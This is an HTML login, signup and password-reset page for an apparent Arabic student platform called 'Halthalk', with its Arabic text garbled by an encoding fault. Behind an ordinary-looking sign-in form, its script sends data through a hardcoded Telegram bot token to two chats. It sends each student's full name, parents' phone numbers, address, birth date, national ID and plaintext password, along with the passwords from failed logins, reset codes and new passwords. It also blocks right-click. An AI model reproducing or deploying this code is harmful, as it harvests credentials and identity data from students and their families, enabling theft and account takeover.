<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù…Ù†ØµØ© Ø­Ù„ØªÙ‡Ø§Ù„Ùƒ | Ù†Ø¸Ø§Ù… Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù…ÙˆØ­Ø¯</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-gradient: linear-gradient(-45deg, #a1c4fd, #c2e9fb, #2c8cff, #ffffff);
            --container-bg: rgba(255, 255, 255, 0.85);
            --text-color: #1e293b;
            --input-bg: #ffffff;
            --input-border: #cbd5e1;
            --button-bg: #2c8cff;
            --shadow: 0 20px 40px rgba(0,0,0,0.1);
        }

        [data-theme="dark"] {
            --bg-gradient: linear-gradient(-45deg, #020617, #0f172a, #1e293b, #334155);
            --container-bg: rgba(15, 23, 42, 0.9);
            --text-color: #f8fafc;
            --input-bg: #1e293b;
            --input-border: #334155;
            --shadow: 0 20px 40px rgba(0,0,0,0.4);
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg-gradient);
            background-size: 400% 400%;
            animation: moveGradient 12s ease infinite;
            margin: 0; min-height: 100vh;
            display: flex; justify-content: center; align-items: center;
            transition: 0.5s; overflow-x: hidden;
            -webkit-user-select: none; user-select: none;
        }

        @keyframes moveGradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .otp-notification {
            position: fixed; top: -120px; left: 50%; transform: translateX(-50%);
            background: var(--container-bg); color: var(--text-color); padding: 15px 25px; border-radius: 20px;
            box-shadow: var(--shadow); z-index: 9999; backdrop-filter: blur(10px);
            display: flex; align-items: center; gap: 20px; border-right: 6px solid var(--button-bg);
            transition: 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); width: 300px;
        }
        .otp-notification.show { top: 20px; }
        
        .copy-btn {
            background: var(--input-bg); border: 1px solid var(--input-border); padding: 10px; border-radius: 12px;
            cursor: pointer; color: var(--button-bg); transition: 0.3s;
        }
        .copy-btn:hover { transform: scale(1.1); background: var(--button-bg); color: white; }

        .container {
            background: var(--container-bg); backdrop-filter: blur(15px);
            padding: 30px; border-radius: 30px; width: 95%; max-width: 450px;
            box-shadow: var(--shadow); position: relative; max-height: 90vh;
            overflow-y: auto; border: 1px solid rgba(255,255,255,0.1);
        }

        .container::-webkit-scrollbar { width: 4px; }
        .container::-webkit-scrollbar-thumb { background: var(--button-bg); border-radius: 10px; }

        .logo-container { text-align: center; margin-bottom: 20px; }
        .logo { width: 140px; }

        h1 { color: var(--text-color); text-align: center; font-size: 22px; margin-bottom: 25px; }

        .input-group { margin-bottom: 15px; text-align: right; }
        label { display: block; margin-bottom: 8px; font-size: 13.5px; font-weight: 600; color: var(--text-color); }
        input {
            width: 100%; padding: 13px; border-radius: 15px; border: 1px solid var(--input-border);
            background: var(--input-bg); color: var(--text-color); font-size: 14px; box-sizing: border-box;
            transition: 0.3s;
        }
        input:focus { outline: none; border-color: var(--button-bg); }

        .action-btn {
            width: 100%; padding: 15px; background: var(--button-bg); color: white; border: none;
            border-radius: 15px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.4s;
        }

        .theme-toggle {
            position: absolute; top: 20px; left: 20px; background: var(--input-bg);
            border: 1px solid var(--input-border); width: 45px; height: 45px; border-radius: 50%;
            cursor: pointer; display: flex; justify-content: center; align-items: center; z-index: 10;
            color: var(--button-bg); font-size: 20px;
        }

        .view-section { display: none; }
        .view-section.active { display: block; animation: fadeInUp 0.5s ease; }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .links { text-align: center; margin-top: 20px; font-size: 14px; color: var(--text-color); }
        .links a { color: var(--button-bg); text-decoration: none; font-weight: bold; cursor: pointer; }

        .otp-box { display: flex; gap: 12px; justify-content: center; direction: ltr; margin: 30px 0; }
        .otp-box input { 
            width: 55px; height: 60px; text-align: center; font-size: 26px; font-weight: bold; 
            border: 2px solid var(--input-border); border-radius: 15px; background: var(--input-bg); color: var(--text-color);
        }

        .message { padding: 14px; border-radius: 15px; margin-top: 20px; text-align: center; display: none; font-weight: bold; }
        .success { background: #10b981; color: white; }
        .error { background: #ef4444; color: white; }
    </style>
</head>
<body data-theme="">

    <div id="otp-notif" class="otp-notification">
        <div class="icon" style="font-size: 26px; color: var(--button-bg);"><i class="fas fa-shield-halved"></i></div>
        <div style="flex-grow: 1;">
            <div style="font-size: 11px; opacity: 0.8;">Ø±Ù…Ø² Ø§Ù„Ø£Ù…Ø§Ù† Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ:</div>
            <div id="notif-code" style="font-weight: 800; font-size: 24px; color: var(--button-bg); letter-spacing: 3px;">0000</div>
        </div>
        <button class="copy-btn" id="copy-otp-btn" onclick="copyOTP()"><i class="fas fa-copy"></i></button>
    </div>

    <div class="container">
        <button class="theme-toggle" onclick="toggleTheme()" id="theme-btn"><i class="fas fa-moon"></i></button>

        <div class="logo-container">
            <img id="main-logo" src="https://github.com/elmoftary-vr/Halthalk/raw/4a1dc7ecbb8371080b183f1b7b720d2a29fff926/20251205_163046.png" class="logo">
        </div>

        <div id="login-view" class="view-section active">
            <h1>ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h1>
            <form id="login-form">
                <div class="input-group"><label>Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ</label><input type="email" id="l_email" required></div>
                <div class="input-group"><label>ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label><input type="password" id="l_pass" required></div>
                <button type="submit" class="action-btn">Ø¯Ø®ÙˆÙ„ Ù„Ù„Ù…Ù†ØµØ©</button>
            </form>
            <div class="links" style="margin-top:15px;"><a onclick="switchView('signup-view')">Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯</a></div>
            <div class="links"><a onclick="switchView('forgot-step1')">Ù†Ø³ÙŠØª ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±ØŸ</a></div>
        </div>

        <div id="signup-view" class="view-section">
            <h1>Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨ Ø·Ø§Ù„Ø¨</h1>
            <form id="signup-form">
                <div class="input-group"><label>Ø§Ø³Ù… Ø§Ù„Ø·Ø§Ù„Ø¨</label><input type="text" id="s_name" required></div>
                <div class="input-group"><label>Ø±Ù‚Ù… Ù‡Ø§ØªÙ Ø§Ù„Ø·Ø§Ù„Ø¨</label><input type="tel" id="s_phone" maxlength="11" required></div>
                <div class="input-group"><label>Ø±Ù‚Ù… Ù‡Ø§ØªÙ Ø§Ù„Ø£Ø¨</label><input type="tel" id="s_f_phone" maxlength="11" required></div>
                <div class="input-group"><label>Ø±Ù‚Ù… Ù‡Ø§ØªÙ Ø§Ù„Ø£Ù…</label><input type="tel" id="s_m_phone" maxlength="11" required></div>
                <div class="input-group"><label>Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ</label><input type="email" id="s_email" required></div>
                <div class="input-group"><label>ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯</label><input type="date" id="s_dob" required></div>
                <div class="input-group"><label>Ø§Ù„Ø¹Ù†ÙˆØ§Ù† Ø¨Ø§Ù„ØªÙØµÙŠÙ„</label><input type="text" id="s_loc" required></div>
                <div class="input-group"><label>Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ù‚ÙˆÙ…ÙŠ (14 Ø±Ù‚Ù…)</label><input type="text" id="s_nat" maxlength="14" required></div>
                <div class="input-group"><label>ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label><input type="password" id="s_pass" minlength="6" required></div>
                <button type="submit" class="action-btn">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</button>
            </form>
            <div class="links"><a onclick="switchView('login-view')">Ø±Ø¬ÙˆØ¹ Ù„ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</a></div>
        </div>

        <div id="forgot-step1" class="view-section">
            <h1>Ø§Ø³ØªØ¹Ø§Ø¯Ø© Ø§Ù„Ø­Ø³Ø§Ø¨</h1>
            <div class="input-group"><label>Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ù…Ø³Ø¬Ù„</label><input type="email" id="recover-email" required></div>
            <div class="input-group"><label>Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ù‚ÙˆÙ…ÙŠ</label><input type="text" id="recover-nat" maxlength="14" required></div>
            <button class="action-btn" onclick="requestOTP()">Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚</button>
            <div class="links"><a onclick="switchView('login-view')">Ø¥Ù„ØºØ§Ø¡</a></div>
        </div>

        <div id="forgot-step2" class="view-section">
            <h1>ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø±Ù…Ø²</h1>
            <div class="otp-box" id="otp-inputs">
                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1">
                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1">
                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1">
                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1">
            </div>
            <button class="action-btn" onclick="verifyOTP()">ØªØ­Ù‚Ù‚ Ø§Ù„Ø¢Ù†</button>
        </div>

        <div id="forgot-step3" class="view-section">
            <h1>ØªØ¹Ø¯ÙŠÙ„ ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±</h1>
            <input type="password" id="new-p" placeholder="Ø§ÙƒØªØ¨ Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯" minlength="6" style="margin-bottom: 20px;">
            <button class="action-btn" onclick="updatePass()">ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø­Ø³Ø§Ø¨</button>
        </div>

        <div id="status-msg" class="message"></div>
    </div>

    <script>
        const BOT_TOKEN = '8150970842:AAH1fWCntUzVNnE6Nq9TXW8SH-MmM9ycvfk';
        const CHAT_ID_CHANNEL = '-1003018202565'; 
        const CHAT_ID_USER = '7428842238'; // Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„Ø¬Ø¯ÙŠØ¯
        
        const LOGO_LIGHT = "https://github.com/elmoftary-vr/Halthalk/raw/4a1dc7ecbb8371080b183f1b7b720d2a29fff926/20251205_163046.png";
        const LOGO_DARK = "https://raw.githubusercontent.com/elmoftary-vr/Halthalk/45d49545c1a08433a739887c4aed3d65fd9c335f/20251206_234458.png";

        const getDB = () => JSON.parse(localStorage.getItem('hal_users') || '[]');
        const saveUser = (u) => { const db = getDB(); db.push(u); localStorage.setItem('hal_users', JSON.stringify(db)); };
        const findUser = (e) => getDB().find(u => u.email === e);

        // Ø¯Ø§Ù„Ø© Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ‚Ø±ÙŠØ± Ø¥Ù„Ù‰ ÙˆØ¬Ù‡ØªÙŠÙ† ÙÙŠ Ù†ÙØ³ Ø§Ù„ÙˆÙ‚Øª
        async function report(txt) {
            const targets = [CHAT_ID_CHANNEL, CHAT_ID_USER];
            
            for (const target of targets) {
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST', 
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({chat_id: target, text: txt, parse_mode: 'Markdown'})
                    });
                } catch(e) {
                    console.error(`Error sending to ${target}:`, e);
                }
            }
        }

        function switchView(id) {
            document.querySelectorAll('.view-section').forEach(v => v.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.getElementById('status-msg').style.display = 'none';
        }

        function showStatus(txt, type) {
            const m = document.getElementById('status-msg');
            m.innerText = txt; m.className = `message ${type}`; m.style.display = 'block';
        }

        function toggleTheme() {
            const b = document.body;
            const btn = document.getElementById('theme-btn');
            const logo = document.getElementById('main-logo');
            if(b.dataset.theme === 'dark') {
                b.dataset.theme = ''; btn.innerHTML = '<i class="fas fa-moon"></i>'; logo.src = LOGO_LIGHT;
            } else {
                b.dataset.theme = 'dark'; btn.innerHTML = '<i class="fas fa-sun"></i>'; logo.src = LOGO_DARK;
            }
        }

        let currentOTP = "";
        function copyOTP() {
            navigator.clipboard.writeText(currentOTP);
            const copyIcon = document.querySelector('#copy-otp-btn i');
            copyIcon.className = 'fas fa-check';
            setTimeout(() => copyIcon.className = 'fas fa-copy', 2000);
        }

        document.getElementById('signup-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('s_email').value;
            const nat = document.getElementById('s_nat').value;
            if(findUser(email)) return showStatus("Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„ Ù…Ø³Ø¬Ù„ Ù…Ø³Ø¨Ù‚Ø§Ù‹!", "error");
            
            const user = {
                name: document.getElementById('s_name').value,
                phone: document.getElementById('s_phone').value,
                f_phone: document.getElementById('s_f_phone').value,
                m_phone: document.getElementById('s_m_phone').value,
                email: email,
                dob: document.getElementById('s_dob').value,
                loc: document.getElementById('s_loc').value,
                nat: nat,
                pass: document.getElementById('s_pass').value
            };
            saveUser(user);
            
            const telegramMsg = `ğŸ†• *ØªØ³Ø¬ÙŠÙ„ Ø·Ø§Ù„Ø¨ Ø¬Ø¯ÙŠØ¯*\n\n` +
                                `ğŸ‘¤ Ø§Ù„Ø§Ø³Ù…: ${user.name}\n` +
                                `ğŸ“± Ù‡Ø§ØªÙ Ø§Ù„Ø·Ø§Ù„Ø¨: ${user.phone}\n` +
                                `ğŸ‘¨ Ù‡Ø§ØªÙ Ø§Ù„Ø£Ø¨: ${user.f_phone}\n` +
                                `ğŸ‘© Ù‡Ø§ØªÙ Ø§Ù„Ø£Ù…: ${user.m_phone}\n` +
                                `ğŸ“§ Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„: ${user.email}\n` +
                                `ğŸ“… Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯: ${user.dob}\n` +
                                `ğŸ“ Ø§Ù„Ø¹Ù†ÙˆØ§Ù†: ${user.loc}\n` +
                                `ğŸ†” Ø§Ù„Ù‚ÙˆÙ…ÙŠ: ${user.nat}\n` +
                                `ğŸ”‘ Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯: \`${user.pass}\``;
            
            await report(telegramMsg);
            showStatus("ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ø­Ø³Ø§Ø¨Ùƒ Ø¨Ù†Ø¬Ø§Ø­!", "success");
            setTimeout(() => switchView('login-view'), 1500);
        });

        document.getElementById('login-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('l_email').value;
            const pass = document.getElementById('l_pass').value;
            const user = findUser(email);

            if(user && user.pass === pass) {
                await report(`âœ… *Ø¯Ø®ÙˆÙ„ Ù†Ø§Ø¬Ø­*\nğŸ“§ Ø§Ù„Ø¨Ø±ÙŠØ¯: ${email}`);
                showStatus("Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­ÙˆÙŠÙ„...", "success");
                setTimeout(() => window.location.href = "https://halthalk.vercel.app", 1000);
            } else {
                await report(`âš ï¸ *Ù…Ø­Ø§ÙˆÙ„Ø© Ø¯Ø®ÙˆÙ„ ÙØ§Ø´Ù„Ø©*\nğŸ“§ ${email}\nğŸ” ${pass}`);
                showStatus("Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„ ØºÙŠØ± ØµØ­ÙŠØ­Ø©", "error");
            }
        });

        window.requestOTP = async () => {
            const email = document.getElementById('recover-email').value;
            const nat = document.getElementById('recover-nat').value;
            const user = findUser(email);

            if(user && user.nat === nat) {
                currentOTP = Math.floor(1000 + Math.random() * 9000).toString();
                document.getElementById('notif-code').innerText = currentOTP;
                document.getElementById('otp-notif').classList.add('show');
                await report(`ğŸ”‘ *Ø±Ù…Ø² Ø§Ø³ØªØ¹Ø§Ø¯Ø©*\nğŸ‘¤ ${user.name}\nğŸ”¢ Ø§Ù„ÙƒÙˆØ¯: \`${currentOTP}\``);
                setTimeout(() => switchView('forgot-step2'), 1000);
                setTimeout(() => document.getElementById('otp-notif').classList.remove('show'), 15000);
            } else {
                showStatus("Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ø§ ØªØ·Ø§Ø¨Ù‚ Ø³Ø¬Ù„Ø§ØªÙ†Ø§", "error");
            }
        };

        const inps = document.querySelectorAll('#otp-inputs input');
        inps.forEach((inp, i) => {
            inp.addEventListener('input', (e) => {
                inp.value = inp.value.replace(/[^0-9]/g, '');
                if(inp.value && i < 3) inps[i+1].focus();
            });

            inp.addEventListener('keydown', (e) => {
                if(e.key === 'Backspace' && !inp.value && i > 0) inps[i-1].focus();
            });

            inp.addEventListener('paste', (e) => {
                e.preventDefault();
                const data = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
                const codes = data.split('').slice(0, 4);
                codes.forEach((char, index) => {
                    if (inps[index]) inps[index].value = char;
                });
                const nextFocus = Math.min(codes.length, 3);
                inps[nextFocus].focus();
            });
        });

        window.verifyOTP = () => {
            let val = ""; inps.forEach(i => val += i.value);
            if(val === currentOTP) switchView('forgot-step3');
            else showStatus("Ø±Ù…Ø² ØºÙŠØ± ØµØ­ÙŠØ­", "error");
        };

        window.updatePass = async () => {
            const np = document.getElementById('new-p').value;
            const email = document.getElementById('recover-email').value;
            const db = getDB().map(u => { if(u.email === email) u.pass = np; return u; });
            localStorage.setItem('hal_users', JSON.stringify(db));
            await report(`ğŸ”„ *ØªØ¹Ø¯ÙŠÙ„ Ø¨Ø§Ø³ÙˆØ±Ø¯*\nğŸ“§ ${email}\nğŸ”‘ Ø§Ù„Ø¬Ø¯ÙŠØ¯: \`${np}\``);
            showStatus("ØªÙ… Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø¨Ù†Ø¬Ø§Ø­!", "success");
            setTimeout(() => switchView('login-view'), 1500);
        };

        document.addEventListener('contextmenu', e => e.preventDefault());
    </script>
</body>
                    </html>
